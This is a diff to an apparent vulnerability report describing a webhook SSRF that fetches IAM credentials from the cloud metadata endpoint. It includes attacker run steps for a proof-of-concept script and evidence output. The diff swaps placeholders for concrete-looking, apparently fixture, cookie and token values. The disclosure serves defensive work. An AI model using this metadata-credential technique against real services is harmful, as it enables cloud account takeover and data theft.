@@ -31,7 +31,7 @@ Any user holding webhook-config permission — a role many orgs hand to non-admi
 
 1. [attacker] Authenticate as any user with webhook-config permission (a role many orgs hand to non-admin integration owners) and run it:
 ```
-export SESSION_COOKIE="<value from an authenticated browser session>"
+export SESSION_COOKIE="sid=7d3f19b2c84e4a0f9e61b5a2d07c8e43"
 python3 poc-ssrf-webhook.py
 ```
 **Expect:** the script prints the stolen `AccessKeyId`/`SecretAccessKey` pair. Full output in Evidence.
@@ -39,11 +39,11 @@ python3 poc-ssrf-webhook.py
 ### Evidence
 
 ```
-[*] role name discovered via metadata SSRF: app-prod-ec2-role
-[*] fetching http://169.254.169.254/latest/meta-data/iam/security-credentials/app-prod-ec2-role
+role: app-prod-ec2-role
+fetched: http://169.254.169.254/latest/meta-data/iam/security-credentials/app-prod-ec2-role
 AccessKeyId:     ASIAABCDEFGHIJKLMNOP                              <-- proof: live temporary credential
 SecretAccessKey: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
-Token:           IQoJb3JpZ2luX2Vj... (truncated)
+Token:           IQoJb3JpZ2luX2VjEXAMPLEtokenAcmeFixture0aGVsbG8td29ybGQtZXhhbXBsZS1zZXNzaW9uLXRva2Vu
 Expiration:      2026-07-06T21:00:00Z
 ```
 
